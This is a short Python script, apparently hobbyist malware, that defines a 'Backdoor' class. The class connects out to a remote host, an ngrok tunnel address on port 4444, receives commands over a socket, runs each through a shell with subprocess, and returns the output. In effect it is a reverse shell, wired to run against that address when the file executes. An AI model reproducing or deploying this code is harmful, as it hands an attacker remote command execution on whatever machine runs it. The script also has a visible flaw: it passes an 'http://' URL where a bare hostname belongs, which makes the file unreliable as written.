import socket, json
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True).decode("utf-8")
        except:
            pass

    def run(self):
        while True:
            command = str(self.reliable_recive())
            command_result = self.execute_system_command(command)
            if command_result:
                self.reliable_send(command_result)
            else:
                self.reliable_send('done')

        connection.close()

my_backdoor = Backdoor("http://47ff-194-44-57-222.ngrok.io", 4444)
my_backdoor.run()





